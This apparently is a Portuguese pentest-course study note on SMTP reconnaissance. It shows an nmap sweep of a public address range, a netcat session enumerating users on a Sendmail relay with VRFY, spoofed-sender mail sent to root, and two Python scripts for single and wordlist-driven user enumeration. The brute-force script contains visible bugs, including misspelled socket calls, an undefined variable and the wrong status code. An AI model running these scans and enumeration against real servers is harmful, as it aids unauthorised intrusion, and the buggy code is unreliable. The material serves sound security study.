```ad-tldr
<mark style='background:var(--mk-color-purple)'>PORTA PADRAO DO SMTP 25</mark>
```

```bash
nmap --open -sS -p 25 -Pn  37.59.174.0/24

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-26 19:36 UTC
Nmap scan report for 37.59.174.28
Host is up (0.23s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap scan report for 37.59.174.29
Host is up (0.24s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap scan report for ip30.ip-37-59-174.eu (37.59.174.30)
Host is up (0.24s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap scan report for ip31.ip-37-59-174.eu (37.59.174.31)
Host is up (0.23s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap scan report for ip74.ip-37-59-174.eu (37.59.174.74)
Host is up (0.23s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap scan report for ip75.ip-37-59-174.eu (37.59.174.75)
Host is up (0.23s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap scan report for ip76.ip-37-59-174.eu (37.59.174.76)
Host is up (0.23s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap scan report for ip77.ip-37-59-174.eu (37.59.174.77)
Host is up (0.24s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap scan report for ip78.ip-37-59-174.eu (37.59.174.78)
Host is up (0.22s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap scan report for ip79.ip-37-59-174.eu (37.59.174.79)
Host is up (0.23s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap scan report for ip100.ip-37-59-174.eu (37.59.174.100)
Host is up (0.24s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap scan report for ip102.ip-37-59-174.eu (37.59.174.102)
Host is up (0.23s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap scan report for 37-59-174-196.dynamixhost.net (37.59.174.196)
Host is up (0.24s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap scan report for 37-59-174-197.dynamixhost.net (37.59.174.197)
Host is up (0.23s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap scan report for 37-59-174-198.dynamixhost.net (37.59.174.198)
Host is up (0.23s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap scan report for 37-59-174-199.dynamixhost.net (37.59.174.199)
Host is up (0.23s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap scan report for ip202.ip-37-59-174.eu (37.59.174.202)
Host is up (0.23s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap done: 256 IP addresses (256 hosts up) scanned in 38.82 seconds

```

Tentamos nos conectar agora utilizando o [[Hacking/Desec/Swiss Army Knife/Netcat]]

```bash
nc -v 172.30.0.128 25

ip102.ip-37-59-174.eu [37.59.174.102] 25 (smtp) open
220 relay.irvinei.com ESMTP Sendmail 8.15.2/8.15.2/Debian-18; Tue, 26 Mar 2024 19:46:00 GMT; (No UCE/UBE) logging access from: [177.44.46.66](FORGED)-177-44-46-66.lav-fb.mastercabo.com.br [177.44.46.66] (may be forged)
EHLO desec
250-relay.irvinei.com Hello 177-44-46-66.lav-fb.mastercabo.com.br [177.44.46.66] (may be forged), pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-AUTH DIGEST-MD5 CRAM-MD5
250-DELIVERBY
250 HELP
```

Atraves do protocolo ``SMTP``  eh possivel  a gente fazer uma  enumeracao de usuarios no  sistema.

Vamos verificar os comandos disponivel com ``HELP``

```bash
HELP
214-2.0.0 This is sendmail version 8.15.2
214-2.0.0 Topics:
214-2.0.0       HELO    EHLO    MAIL    RCPT    DATA
214-2.0.0       RSET    NOOP    QUIT    HELP    VRFY
214-2.0.0       EXPN    VERB    ETRN    DSN     AUTH
214-2.0.0       STARTTLS
214-2.0.0 For more info use "HELP <topic>".
214-2.0.0 To report bugs in the implementation see
214-2.0.0       http://www.sendmail.org/email-addresses.html
214-2.0.0 For local information send email to Postmaster at your site.
214 2.0.0 End of HELP info

```

Agora vamos verificar se existge algum usuario 

```bash
VRFY ricardo
550 5.1.1 ricardo... User unknown

VRFY root
250 2.1.5 root <root@relay.irvinei.com>

```

Otimo 🙂 o usuario <mark style='background:var(--mk-color-red)'>root</mark> existe!

Aqui podemos identificar um padrao , por exemplo sempre quando ha um usuario existente ele retorna um codigo ``250`` seguido do usuario , e quando nao existe o codigo retornado eh ``550`` dizendo que nao existe , isso pode ser uma vulnerabilidade porque isso me permite fazer enumeracao de usuarios. 

```bash
VRFY root
250 2.1.5 root <root@relay.irvinei.com>
VRFY www-data
250 2.1.5 www-data <www-data@relay.irvinei.com>
VRFY joao
550 5.1.1 joao... User unknown

```

Enviando mensagem de um usuario para outro no [[Hacking/Desec/Swiss Army Knife/Telnet]] com [[SMTP]]

```bash
VRFY www-data
250 2.1.5 www-data <www-data@relay.irvinei.com>

MAIL FROM: <www-data@relay.irvinei.com>
250 2.1.0 <www-data@relay.irvinei.com>... Sender ok


RCPT TO: root
250 2.1.5 root... Recipient ok

DATA
354 Enter mail, end with "." on a line by itself
Ola root
.
250 2.0.0 42QK2skw1349920 Message accepted for delivery

```

Acabamos de enviar uma mensagem para o usuario <mark style='background:var(--mk-color-red)'>root</mark> , note que temos uma condicao de vulnerabilidade ao tentarmos enviar uma mensagem para algum usuario inexistente:
```bash
RCPT TO: <wallacehenri11@gmail.com>
550 5.7.1 <wallacehenri11@gmail.com>... Relaying denied. IP name possibly forged [177.44.46.66]

```

Podemos fazer uma enumeracao de quais usuarios estao ativos neste sistema operacional atraves desse protocolo [[SMTP]]

<h3 align="center">SMPT EM PYTHON</h3>

```python
import socket
import sys

tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp.connect((sys.argv[1], 25))
banner = tcp.recv(1024)
print banner

tcp.send("VRFY"+sys.argv[2]+"\r\n")
user = tcp.recv(1024)
print user
```


### Brute force

```python
import socket, sys , re

file = open("wordlist.txt")

for line in file:
	tcp.socket.socket(socket.AF_INET, socket.SOCKET_STREAM)
	tcp.connect((sys.argv[1], 25))
	banner = tcp.recv(1024)
	tcp.send("VRFY "+linha)
	user = tcp.recv(1024)
	if re.search("252", user):
		print("USUARIO ENCONTRADO:" + user.strip("252 2.0.0"))
```